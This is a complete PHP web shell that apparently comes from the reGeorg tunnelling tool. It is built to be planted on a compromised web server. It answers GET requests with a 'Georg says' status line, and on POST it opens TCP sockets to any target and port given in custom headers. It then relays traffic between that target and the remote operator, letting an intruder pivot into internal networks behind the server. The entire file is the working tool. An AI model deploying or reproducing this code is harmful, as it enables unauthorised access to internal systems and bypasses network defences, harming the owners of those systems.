<?php
@ob_clean();

if( !function_exists('apache_request_headers') ) {
    function apache_request_headers() {
        $k = array();
        $l = '/\AHTTP_/';

        foreach($_SERVER as $key => $val) {
            if( preg_match($l, $key) ) {
                $m = preg_replace($l, '', $key);
                $n = array();
                $n = explode('_', $m);
                if( count($n) > 0 and strlen($m) > 2 ) {
                    foreach($n as $o => $p) {
                        $n[$o] = ucfirst($p);
                    }

                    $m = implode('-', $n);
                }
                $k[$m] = $val;
            }
        }
        return( $k );
    }
}
if ($_SERVER['REQUEST_METHOD'] === 'GET')
{
    exit("Georg says, 'All seems fine'");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	set_time_limit(0);
	$b=apache_request_headers();
	$c = $b["X-CMD"];
    switch($c){
		case "CONNECT":
			{
				$a = $b["X-TARGET"];
				$e = (int)$b["X-PORT"];
				$d = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
				if ($d === false)
				{
					header('X-STATUS: FAIL');
					header('X-ERROR: Failed creating socket');
					exit;
				}
				$res = @socket_connect($d, $a, $e);
                if ($res === false)
				{
					header('X-STATUS: FAIL');
					header('X-ERROR: Failed connecting to target');
					exit;
				}
				socket_set_nonblock($d);
				@session_start();
				$_SESSION["run"] = true;
                $_SESSION["writebuf"] = "";
                $_SESSION["readbuf"] = "";
                ob_end_clean();
                header('X-STATUS: OK');
                header("Connection: close");
                ignore_user_abort();
                ob_start();
                $f = ob_get_length();
                header("Content-Length: $f");
                ob_end_flush();
                flush();
				session_write_close();

				while ($_SESSION["run"])
				{
					$g = "";
					@session_start();
					$h = $_SESSION["writebuf"];
					$_SESSION["writebuf"] = "";
					session_write_close();
                    if ($h != "")
					{
						$i = socket_write($d, $h, strlen($h));
						if($i === false)
						{
							@session_start();
                            $_SESSION["run"] = false;
                            session_write_close();
                            header('X-STATUS: FAIL');
							header('X-ERROR: Failed writing socket');
						}
					}
					while ($o = socket_read($d, 512)) {
					if($o === false)
						{
                            @session_start();
                            $_SESSION["run"] = false;
                            session_write_close();
							header('X-STATUS: FAIL');
							header('X-ERROR: Failed reading from socket');
						}
						$g .= $o;
					}
                    if ($g!=""){
                        @session_start();
                        $_SESSION["readbuf"] .= $g;
                        session_write_close();
                    }
                    #sleep(0.2);
				}
                socket_close($d);
			}
			break;
		case "DISCONNECT":
			{
                error_log("DISCONNECT recieved");
				@session_start();
				$_SESSION["run"] = false;
				session_write_close();
				exit;
			}
			break;
		case "READ":
			{
				@session_start();
				$ger = $_SESSION["readbuf"];
                $_SESSION["readbuf"]="";
                $i = $_SESSION["run"];
				session_write_close();
                if ($i) {
					header('X-STATUS: OK');
                    header("Connection: Keep-Alive");
					echo $ger;
					exit;
				} else {
                    header('X-STATUS: FAIL');
                    header('X-ERROR: RemoteSocket read filed');
					exit;
				}
			}
			break;
		case "FORWARD":
			{
                @session_start();
                $i = $_SESSION["run"];
				session_write_close();
                if(!$i){
                    header('X-STATUS: FAIL');
					header('X-ERROR: No more running, close now');
                    exit;
                }
                header('Content-Type: application/octet-stream');
				$j = file_get_contents("php://input");
				if ($j) {
					@session_start();
					$_SESSION["writebuf"] .= $j;
					session_write_close();
					header('X-STATUS: OK');
                    header("Connection: Keep-Alive");
					exit;
				} else {
					header('X-STATUS: FAIL');
					header('X-ERROR: POST request read filed');
				}
			}
			break;
	}
}
exit;
